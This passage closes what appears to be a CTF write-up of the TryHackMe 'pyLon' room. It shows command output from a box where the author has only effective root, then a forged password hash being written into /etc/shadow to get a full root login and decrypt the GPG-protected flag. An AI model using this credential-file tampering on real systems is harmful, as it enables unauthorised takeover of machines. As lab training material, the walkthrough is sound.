       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:0a:a3:c6:24:7f brd ff:ff:ff:ff:ff:ff
    inet 10.10.71.253/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2123sec preferred_lft 2123sec
    inet6 fe80::a:a3ff:fec6:247f/64 scope link 
       valid_lft forever preferred_lft forever
3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 100
    link/none 
    inet 172.31.12.1 peer 172.31.12.2/32 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 fe80::bd2:40fa:2a1d:59fd/64 scope link stable-privacy 
       valid_lft forever preferred_lft forever
4: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:5e:36:3a:e4 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:5eff:fe36:3ae4/64 scope link 
       valid_lft forever preferred_lft forever
6: veth09d453b@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether e6:83:64:8f:88:c0 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::e483:64ff:fe8f:88c0/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

### Rooted

**In the `/root` directory, we see a `root.txt` file, which is encrypted by GPG:**
```
bash-4.4# ls -lah /root
total 36K
drwx------  5 root root 4.0K Jan 30  2021 .
drwxr-xr-x 24 root root 4.0K Mar 30  2021 ..
lrwxrwxrwx  1 root root    9 Jan 30  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
drwx------  4 root root 4.0K Jan 30  2021 .gnupg
drwxr-xr-x  3 root root 4.0K Jan 30  2021 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwxr-xr-x  2 root root 4.0K Jan 30  2021 .vim
-rw-------  1 root root  757 Jan 30  2021 .viminfo
-rw-r--r--  1 root root  492 Jan 27  2021 root.txt.gpg
```

**Let's try to decrypt it:**
```
bash-4.4# gpg -d root.txt.gpg 
gpg: can't open 'root.txt.gpg': Permission denied
gpg: decrypt_message failed: Permission denied
```

**Permission denied. This is because we're not really root:**
```
bash-4.4# id
uid=1002(lone) gid=1002(lone) euid=0(root) egid=0(root) groups=0(root),1002(lone)
```

As you can see, our UID is still `lone`, but our effective UID (EUID) is `root`.

**To become a real root, we can modify the `/etc/shadow` root's password hash:**

- Generate shadow password hash:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/pyLon]
└─# openssl passwd -6 -salt abc password
$6$abc$rvqzMBuMVukmply9mZJpW0wJMdDfgUKLDrSNxf9l66h/ytQiKNAdqHSj5YPJpxWJpVjRXibQXRddCl9xYHQnd0
```

- Modify `/etc/shadow`:

```
bash-4.4# nano /etc/shadow

root:$6$abc$rvqzMBuMVukmply9mZJpW0wJMdDfgUKLDrSNxf9l66h/ytQiKNAdqHSj5YPJpxWJpVjRXibQXRddCl9xYHQnd0:18480:0:99999:7:::
[...]
```

- Login as root:

```
pood@pylon:/home/lone$ su root
Password: 
root@pylon:/home/lone# id
uid=0(root) gid=0(root) groups=0(root)
```

I'm the real root!

**Let's decrypt the GPG file.**

**root.txt.gpg:**
```
root@pylon:/home/lone# gpg -d /root/root.txt.gpg 
gpg: encrypted with 3072-bit RSA key, ID 91B77766BE20A385, created 2021-01-27
      "I am g ROOT <root@pylon.thm>"
ThM{Redacted}
```

# Conclusion

What we've learned:

1. Cracking Steganography Image File's Passphrase via `stegseek`
2. Using `exiftool` To View Image's Metadata
3. Viewing Git Repository Commits History
4. Decrypting GPG File via Passphrase
5. Vertical Privilege Escalation via Modifying OpenVPN Configuration File